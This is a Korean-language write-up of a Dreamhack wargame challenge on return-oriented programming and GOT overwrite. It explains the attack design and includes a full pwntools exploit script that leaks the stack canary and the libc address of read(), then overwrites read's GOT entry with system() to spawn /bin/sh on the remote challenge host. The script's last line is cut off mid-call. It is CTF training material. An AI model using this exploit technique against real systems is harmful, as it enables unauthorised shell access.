- **Return Oriented Programming(ROP)**: 리턴 가젯을 이용하여 복잡한 실행 흐름을 구현하는 기법. 문제 상황에 맞춰 공격자가 유연하게 익스플로잇을 작성할 수 있다.
- **GOT Overwrite**: 어떤 함수의 GOT 엔트리를 덮고, 해당 함수를 재호출하여 원하는 코드를 실행시키는 공격 기법

```python
from pwn import *
from pwn import p64
from pwn import u64

p = remote("host3.dreamhack.games", 23578)
e = ELF("./rop")
lib = ELF("./libc.so.6")

buf = b'A'*57 ########### Canary Leak Start
p.sendafter(': ', buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
print('Canary:', hex(canary)) ########### Canary Leak End

read_plt = e.plt['read'] #pwntools의 ELF 명령어 링크 참고
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x400853 #ROPgadget --binary ./rop --re "pop rdi"
pop_rsi_r15 = 0x400851
ret = 0x400596 #ROPgadget --binary ./rop

payload = b'A'*56 + p64(canary) + b'B'*8 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(write_plt) #(1)payload to leak "addr of read()"
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt) #(2) payload of "read(0, read_got, ...)
payload += p64(pop_rdi) + p64(read_got+0x8) + p64(ret) + p64(read_plt) #(3) payload of "read("/bin/sh") == system("/bin/sh")"

p.sendafter(': ', payload)
read = u64(p.recvn(6)+b'\x00'*2) #(1) recieving "addr of read()"
lib_base = read - lib.symbols['read'] # addr of libc_base
system = lib_base + lib.symbols['system'] # addr of system()
print('read:', hex(read))
print('libc_base:', hex(lib_base))
print('system:', hex(system))

p.send(p64(system) + b"/bin/sh\x00") # (2), (3) send "addr of system()" to overwrite read_got through "read(0, read_got, 100)" & send "/bin/sh" to overwrite "read_got + 0x8"

p.interactive(
```

exploit

```bash

```

![rop.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/rop.jpg)

워게임환경과 vm의 환경이 맞지가 않아서 한 10번 시도한 끝에 겨우 성공.

수정하며 배운 것 정리

**[Remind]**

1) plt에는 got엔트리의 주소가 적혀있고 got에는 해당 함수의 실제 주소가 적혀있다.

2) ASLR이 적용되면 실행할 때마다 스택, 힙, libc_base의 주소가 바뀐다

**기본 설계]**

**1st) system 함수의 주소 계산:** 이 바이너리에서 호출하는 함수들은 "libc.so.6"에 정의되어 있다. 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로, system 함수도 프로세스 메모리에 같이 올라간다.

**But,** 바이너리가 system 함수를 직접 호출하지 않으므로, GOT에는 system 함수의 주소가 없다. 그러나, read, puts, printf, write 등의 함수는 GOT에 등록되어있다. **각 함수 사이의 offset은 항상 일정**하므로, 이 함수들과 system 함수와의 offset을 이용하여 system 함수의 주소를 구할 수 있을 것이다.

**2nd) "/bin/sh" 삽입:** rop 바이너리의 데이터 세그먼트에는 "/bin/sh" 문자열이 없다. 따라서 우리가 사용할 수 있는 방법엔 두 가지가 있다.

a) 이 문자열을 임의 버퍼에 직접 주입하여 잠조한다.

b) 다른 파일에 포함된 것을 사용한다.

(b) ex) "/bin/sh" 문자열의 주소도 system 함수의 주소를 계산할 때처럼 libc 영역의 임의 주소를 구하고, 그 주소로부터 거리를 더하거나 빼서 계산할 수 있다.

이번 실습에서는 (a)의 방법을 이용할 것이다.

**3rd) GOT Overwrite:** 함수를 호출하는 과정은 다음과 같다.

a) 호출할 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.

b) 찾은 주소를 GOT에 적고, 이를 호출한다.

c) 해당 함수를 다시 호출할 경우, GOT에 적힌 주소를 그대로 참조한다.

이때 **(c)에서 GOT에 적힌 주소를 검증하지 않고 참조**한다. -> GOT에 적힌 함수의 주소를 변조하면, 해당 함수를 호출했을 때 공격자가 원하는 함수를 실행시킬 수 있다. == **GOT Overwrite**

**[exploit 코드 설계]**

0) 바이너리에 적용된 보안 정책 확인

**1) Canary 우회**

**2) system 함수의 주소 구하기**

write함수를 이용하여 GOT에 적힌 read 함수의 주소를 출력하고, 그렇게 해서 구한 read 함수의 주소를 이용해 read 함수와 system 함수의 offset을 이용하여 system 함수의 주소를 계산한다.

이를 위해 pwntools의 ELF.symbols, ELF.plt, ELF.got 메소드 이용.

**3) "/bin/sh" 입력하기**

"/bin/sh"은 덮어쓸 GOT 엔트리 뒤에 같이 입력하면 된다. 이 바이너리에서는 "/bin/sh" 입력을 위해 read 함수를 이용할 수 있다.

**read, write 함수의 인자: rdi(=fd), rsi(=읽을 or 쓸 메세지), rdx(=메세지 길이)**

#main 함수의 에필로그 시점에서 rdx 값이 충분히 큰 값인 0x100으로 되어 있어, 여기선 리턴 가젯을 이용하여 굳이 rdx 값을 따로 설정해주지 않았음. 아래 사진 참고 (read() & write()의 인자 rdi(fd), rsi(buf), rdx(size))

**주의할 점은, 각 함수가 실행되는 시점에 stack이 0x10 단위로 align 되어있어야 한다는 것이다.**

**또한 read()의 주소를 leak할 때 write가 아닌 소스코드에 포함된 puts()나 printf()를 사용해도 좋다.**
